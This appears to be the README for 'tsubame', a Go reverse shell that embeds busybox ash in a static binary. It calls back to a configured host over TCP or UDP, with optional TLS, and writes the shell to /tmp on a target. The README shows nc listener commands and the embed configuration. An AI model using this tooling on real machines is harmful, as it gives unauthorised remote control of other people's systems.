## Overview

tsubame is a simple reverse shell written with the aim of being a self contained binary that could be deployed in environments where a shell (such as `bash` or `sh`) may not be available.

Upon compilation, tsubame produces a static binary which contains a copy of `busybox`'s `ash` using the [embed package](https://pkg.go.dev/embed). At runtime `tsubame` uses `ash` as a "back-end", passing commands read over the network and feeding it into `ash`. 

For this reason, a copy of `ash` which is compatible with the target architecture must be present in the `data/` directory during the build. The default copy of ash has been compiled for x8664 so the resulting binary will not work on devices using other architectures such as ARM.

For further details about configuration, please see the relevant section below.

## Usage

When executed, `tsubame` calls back to the host:port pair specified in the configuration. It is up to user to handle the incoming connection.

Here are some examples assuming `tsubame` had been configured to call back to `nc` running on port 1234, followed by a demo using `openssl s_server`.

```console
$ nc -l 1234        # tcp plain text
$ nc -ul 1234       # udp plain text
```

https://github.com/user-attachments/assets/5172094b-c899-4ebb-b358-95e8956959d1

## Embedded files
As stated above, `tsubame` embeds some files in the final binary produced. Currently, the following files are included:

- `ash`: A copy of `busybox`'s ash
- `config.json`: The configuration file

All of the files that are embedded live in the `data/` directory. 

If the user would like to replace any of these files, they should place the files in `data/` and update the global variables in `config.go`.   

An example of this is shown in the configuration section.

## Configuration

Configuration is done through editing `data/config.json`. 

This configuration file is also embedded into the binary along side the shell, and is referenced by `tsubame` at runtime. 

Please do not rename the file, or the program produced will not work.

As stated earlier, any files to be embedded should be placed in `data/`, and the appropriate variables in `config.go` should be updated. 

```go
//go:embed data
var fs embed.FS

var DefaultConfigFile = "config.json"       // This
var DefaultShell = "ash"                    // And this.
```

The following is a description of the parameters in the configuration file:

- `address`: The IP address or the host name of the machine to connect to
- `port`: The port to connect to.
- `protocol`: The protocol configuration. 
    - `conn_type`: Either "udp" or "tcp"
    - `tls`: Toggles whether to use TLS or not. Currently TLS is only supported when `conn_type` is  "tcp".
- `timeout`: The time out value in **seconds**. The process will automatically terminate if there is no input for the given timeout value. This is useful when using `udp`, where there is no concept of a session. If the server side-process (the listening process) terminates for some reason, the shell will be running on the target machine indefinitely if it were not for the timeout.
- `shellpath`: The directory `ash` should be written to.
- `debug`: Toggle debug output.

Default config file: 

```json
{
	"address": "localhost",
	"port": 1234,
	"protocol": {
		"conn_type": "tcp",
		"tls": true
	},
	"timeout": 5,
	"shellpath": "/tmp",
	"debug": true
}
``` 
## Disclaimer

This program was written for educational purposes. The author will not take responsibility for the actions of others.
